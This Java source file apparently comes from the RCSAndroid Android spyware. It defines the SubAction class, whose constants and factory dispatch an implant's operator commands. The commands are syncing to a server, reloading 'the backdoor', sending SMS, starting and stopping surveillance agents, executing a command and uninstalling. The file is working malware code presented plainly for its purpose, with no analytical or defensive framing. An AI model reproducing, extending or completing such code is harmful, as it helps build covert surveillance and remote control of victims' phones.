/***********************************************
 * Create by : Alberto "Quequero" Pelliccione
 * Company   : HT srl
 * Project   : RCSAndroid
 * Created   : 03-dec-2010
 **********************************************/

package com.ht.RCSAndroidGUI.action;

import com.ht.RCSAndroidGUI.Debug;

public abstract class SubAction implements Runnable {

	/**
	 * Actions definitions
	 */
	public static int ACTION = 0x4000;
	public final static int ACTION_SYNC = 0x4001; // Sync su server
	public final static int ACTION_UNINSTALL = 0x4002; // Uninstall
	public final static int ACTION_RELOAD = 0x4003; // Reload della backdoor
	public final static int ACTION_SMS = 0x4004; // Invia un SMS
	public final static int ACTION_TOOTHING = 0x4005; // Non utilizzata
	public final static int ACTION_START_AGENT = 0x4006; // Avvia un agente
	public final static int ACTION_STOP_AGENT = 0x4007; // Ferma un agente
	public final static int ACTION_SYNC_PDA = 0x4008; // Sync su Mediation Node
	public final static int ACTION_EXECUTE = 0x4009; // Esegui un comando
	public final static int ACTION_SYNC_APN = 0x400a; // Sync su APN
	public final static int ACTION_LOG = 0x400b; // Crea un LOG_INFO

	/**
	 * Action type
	 */
	private int subActionType;

	/**
	 * Parameters
	 */
	private byte[] subActionParams;

	public SubAction(int type, byte[] params) {
		this.subActionType = type;
		this.subActionParams = params;
	}

	public static SubAction factory(final int type, final byte[] confParams) {
		Debug debug = new Debug();
		switch (type) {
		case SubAction.ACTION_SYNC:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC ***");
			// #endif
			return new SyncActionInternet(type, confParams);
		case ACTION_UNINSTALL:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_UNINSTALL ***");
			// #endif
			return new UninstallAction(type, confParams);
		case ACTION_RELOAD:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_RELOAD ***");
			// #endif
			return new ReloadAction(type, confParams);
		case ACTION_SMS:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SMS ***");
			// #endif
			return new SmsAction(type, confParams);
		case ACTION_TOOTHING:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_TOOTHING ***");
			// #endif
			return new ToothingAction(type, confParams);
		case ACTION_START_AGENT:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_START_AGENT ***");
			// #endif
			return new StartAgentAction(type, confParams);
		case ACTION_STOP_AGENT:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_STOP_AGENT ***");
			// #endif
			return new StopAgentAction(type, confParams);
		case ACTION_SYNC_PDA:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC_PDA ***");
			// #endif
			return new SyncPdaAction(type, confParams);
		case ACTION_EXECUTE:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_EXECUTE ***");
			// #endif
			return new ExecuteAction(type, confParams);
		case ACTION_SYNC_APN:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_SYNC ***");
			// #endif
			return new SyncActionApn(type, confParams);
		case ACTION_LOG:
			// #ifdef DEBUG
			debug.trace("Factory *** ACTION_INFO ***");
			// #endif
			return new LogAction(type, confParams);
		default:
			return null;
		}
	}

	public int getSubActionType() {
		return subActionType;
	}

	public byte[] getSubActionParams() {
		return subActionParams;
	}

	private boolean finished;

	public abstract boolean execute();

	public synchronized boolean isFinished() {
		return finished;
	}

	public void run() {
		try {
			execute();
		} finally {
			synchronized (this) {
				notify();
				finished = true;
			}
		}
	}
}
